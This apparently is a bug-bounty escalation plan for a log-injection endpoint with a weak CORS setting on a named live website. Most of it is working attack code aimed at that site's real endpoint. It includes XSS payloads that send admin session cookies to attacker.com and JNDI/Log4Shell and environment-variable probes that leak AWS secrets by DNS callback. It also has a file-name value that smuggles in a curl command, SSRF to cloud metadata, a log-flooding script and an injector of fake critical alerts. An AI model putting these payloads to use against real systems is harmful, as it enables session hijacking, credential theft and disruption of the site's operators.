# Impact Escalation Plan - CORS Log Injection

## Goal
Transform theoretical CORS vulnerability into demonstrable, meaningful security impact.

## Attack Chain - Prove Real Harm

### Phase 1: Verify Log Storage & Retrieval ⚠️ CRITICAL FIRST STEP

**Why:** If logs aren't stored/visible, there's no impact.

**Actions:**
1. **Test if injected logs are stored:**
   - Inject unique identifier: `message: "TEST_ID_92847562834"`
   - Search for ways to retrieve logs:
     - Look for admin/debug endpoints: `/api/logs`, `/admin/logs`, `/debug`
     - Check for log viewer pages: `/logs`, `/monitoring`, `/dashboard`
     - Test GraphQL introspection for log queries
     - Check if logs appear in error pages (trigger 500 errors with unique IDs)

2. **Enumerate other API endpoints:**
   ```bash
   # Use discovered API patterns
   /api/front/v2/logs        # Already known
   /api/front/v2/logs/recent # Try variations
   /api/back/v2/logs         # Backend endpoint?
   /api/admin/logs           # Admin access?
   ```

3. **Test for log reflection in responses:**
   - Inject logs with unique markers
   - Make subsequent requests to various endpoints
   - Search responses for reflected log data

**If logs are NOT retrievable:** Focus on blind impacts (flooding, cost, alert fatigue)

### Phase 2: Chain with Other Vulnerabilities

**Escalation Path 1: CORS + CSRF = Account Takeover**
- Use log injection to identify other CORS-vulnerable endpoints
- Test if `/api/front/v2/*` has pattern of wildcard CORS
- Look for state-changing endpoints with same misconfiguration

**Escalation Path 2: Log Injection → SSRF**
- Inject logs with URLs: `message: "Error fetching http://internal-service/"`
- Check if log processor fetches/validates URLs
- Test for callback URLs in log metadata:
  ```json
  {
    "level": "error",
    "message": "Webhook failed",
    "webhookUrl": "http://169.254.169.254/latest/meta-data/",
    "retryUrl": "http://internal-admin:8080/admin"
  }
  ```

**Escalation Path 3: Blind SSRF via Log Processing**
- Test if log processor makes DNS queries:
  ```json
  {
    "message": "Error at ${jndi:ldap://unique-id.attacker-dns.com/}",
    "userAgent": "${env:AWS_ACCESS_KEY_ID}.attacker-dns.com"
  }
  ```
- Monitor DNS server for callback (proves blind SSRF)

### Phase 3: Demonstrate Business Impact

**Cost Calculation Attack:**
1. Measure log size: ~500 bytes per log
2. Flood attack: 10,000 logs/minute = 5MB/min = 300MB/hour = 7.2GB/day
3. Calculate cost (if using CloudWatch/Datadog):
   - CloudWatch: $0.50/GB ingestion = $3.60/day
   - Datadog: $0.10/GB ingestion = $0.72/day
   - Storage: Add $0.03/GB/month
4. **Scale up:** 1000 victims = $3,600/day = $100K+/month

**Alert Fatigue Attack:**
1. Find error threshold for alerts (test incrementally)
2. Inject critical errors just below threshold
3. Prove real errors get masked:
   ```json
   {
     "level": "critical",
     "message": "Payment processor down",
     "service": "billing",
     "severity": "P1"
   }
   ```
4. Document that real incidents would be hidden

**Compliance Impact:**
1. SOC2/PCI-DSS require log integrity
2. Demonstrate audit trail can be poisoned
3. Show attacker could:
   - Insert fake "successful" security events
   - Delete evidence by flooding with noise
   - Frame innocent users by injecting fake actions

### Phase 4: Demonstrate XSS (If Log Viewer Exists)

**Find the log viewer:**
- Admin panels: `/admin`, `/internal`, `/ops`
- Monitoring dashboards: Kibana, Grafana, custom tools
- Error tracking: Sentry, Rollbar, custom systems

**Once found, inject graduated XSS payloads:**
1. Simple: `<img src=x onerror=alert(1)>`
2. Reflected: `<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>`
3. Persistent: Inject into stack trace field (often rendered as code)
4. **Session hijacking:**
   ```javascript
   fetch('https://stripchat.com/api/front/v2/logs', {
     method: 'POST',
     body: JSON.stringify({
       message: "Error",
       stack: "<img src=x onerror=\"fetch('http://attacker.com/steal?admin_session='+document.cookie)\">"
     })
   });
   ```

### Phase 5: Test for Remote Code Execution

**Log4Shell-style exploitation:**
1. **Test for JNDI injection (if using Java backend):**
   ```json
   {
     "message": "${jndi:ldap://attacker.com:1389/Exploit}",
     "stack": "${jndi:dns://unique-test-id.attacker-dns.com}"
   }
   ```
   - Monitor for DNS callback
   - If callback received = RCE possible

2. **Template injection (if using Python/Ruby):**
   ```json
   {
     "message": "{{7*7}}",  // Should render as 49 if vulnerable
     "stack": "{{config.items()}}"  // Flask config exposure
   }
   ```

3. **Command injection in log rotation:**
   ```json
   {
     "filename": "test.log; curl http://attacker.com/rce",
     "message": "Normal log"
   }
   ```

4. **Deserialization attacks (if logs are serialized):**
   ```json
   {
     "message": "rO0ABXNy...[base64 serialized payload]"
   }
   ```

### Phase 6: Exfiltration & Reconnaissance

**Use logging as a data channel:**
1. **Exfiltrate via error logs:**
   - Trigger errors that log sensitive data
   - Read logs to extract data

2. **Reconnaissance via log injection:**
   - Inject logs to probe internal systems
   - Log responses reveal internal architecture

3. **Timing attacks:**
   - Measure response times to different payloads
   - Infer internal processing logic

## High-Impact Proof of Concepts

### PoC 1: Demonstrate Actual Cost Impact
```html
<!-- host on attacker.com and drive traffic to it -->
<script>
// Flood attack: 10,000 logs in 60 seconds
let count = 0;
const interval = setInterval(() => {
  fetch('https://stripchat.com/api/front/v2/logs', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      level: 'error',
      message: 'A'.repeat(400), // Pad to ~500 bytes
      timestamp: new Date().toISOString(),
      iteration: count++
    })
  });

  if (count >= 10000) clearInterval(interval);
}, 6); // ~167 req/sec
</script>
```

**Calculate:** 10,000 users visit page = 100M logs/hour = 50GB ingestion = $25-$50 cost

### PoC 2: Demonstrate Alert Fatigue (More Incisive)
```javascript
// Realistic attack: Inject fake critical alerts
async function poisonAlerts() {
  const criticalErrors = [
    "Database connection pool exhausted - 0/100 available",
    "Redis cluster unreachable - all 6 nodes down",
    "Payment gateway timeout - 100% failure rate",
    "CDN origin unreachable - serving stale content",
    "Authentication service degraded - 503 responses"
  ];

  // Inject one critical error every 30 seconds
  setInterval(() => {
    const error = criticalErrors[Math.floor(Math.random() * criticalErrors.length)];
    fetch('https://stripchat.com/api/front/v2/logs', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        level: 'critical',
        message: error,
        timestamp: new Date().toISOString(),
        service: 'platform',
        severity: 'P1',
        oncall: true
      })
    });
  }, 30000);
}
```

**Impact:** Engineers investigate phantom outages, real alerts ignored, PagerDuty fatigue

### PoC 3: Chain with Reconnaissance
```javascript
// Use log injection to probe for other vulnerabilities
async function reconViaLogs() {
  const probes = [
    // Test if logs reflect environment vars
    { message: "${env:AWS_SECRET_ACCESS_KEY}" },
    { message: "${env:DATABASE_URL}" },

    // Test if logs trigger SSRF
    { callbackUrl: "http://169.254.169.254/latest/meta-data/" },

    // Test if logs are processed by vulnerable systems
    { message: "${jndi:ldap://$(whoami).attacker.com/}" },

    // Test for path traversal in log filenames
    { filename: "../../../etc/passwd" }
  ];

  for (const probe of probes) {
    await fetch('https://stripchat.com/api/front/v2/logs', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        level: 'error',
        timestamp: new Date().toISOString(),
        ...probe
      })
    });

    await new Promise(r => setTimeout(r, 1000)); // Rate limit
  }
}
```

## Recommended Testing Order

1. **[IMMEDIATE]** Test if logs are stored/retrievable
   - If YES → XSS/injection chains become viable
   - If NO → Focus on blind impacts (cost, alerts, compliance)

2. **[HIGH VALUE]** Test for SSRF via DNS callbacks
   - Proves server-side processing
   - Opens RCE possibilities

3. **[HIGH VALUE]** Demonstrate cost impact with calculations
   - Concrete $ amount is undeniable
   - Easy to reproduce

4. **[MEDIUM]** Test for Log4Shell/template injection
   - Could escalate to CRITICAL
   - Worth 30 minutes of testing

5. **[MEDIUM]** Find log viewer and demonstrate XSS
   - Requires reconnaissance
   - High impact if found

## Red Flags to Avoid

❌ Don't flood production systems (demonstrate with small test, calculate impact)
❌ Don't actually exploit RCE if found (prove it's possible, don't execute)
❌ Don't exfiltrate real user data (use test data only)
❌ Don't disrupt real operations (test in isolation)

## Making It "Incisive"

The triager wants to see:
- **Concrete proof**, not theory: "I did X and Y happened"
- **Business impact with numbers**: "$X cost, Y hours wasted"
- **Attack chains**: "This + that = account takeover"
- **Evidence**: Screenshots, videos, server responses

## Updated Report Structure

**Instead of:** "An attacker could potentially..."
**Use:** "I demonstrated this attack by... [evidence]. This results in... [measured impact]."

**Instead of:** "May lead to XSS"
**Use:** "I injected XSS payload [payload]. When viewed at [URL], it executed [screenshot]. This allows attackers to steal admin sessions [video]."

**Instead of:** "Could increase costs"
**Use:** "I calculated a single attacker flooding 10K logs creates [X MB] data at $[Y]/GB = $[Z] daily cost. Scaled to [N] victims = $[Total] monthly."
